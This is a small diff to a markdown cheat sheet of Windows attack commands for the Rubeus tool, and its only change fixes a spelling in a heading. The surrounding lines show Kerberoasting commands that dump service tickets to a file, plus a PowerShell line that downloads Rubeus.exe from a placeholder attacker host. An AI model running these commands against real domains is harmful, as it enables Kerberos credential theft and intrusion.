@@ -50,7 +50,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
 ```
 
-## Kerberoasting and outputting on a file with a spesific format
+## Kerberoasting and outputting on a file with a specific format
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
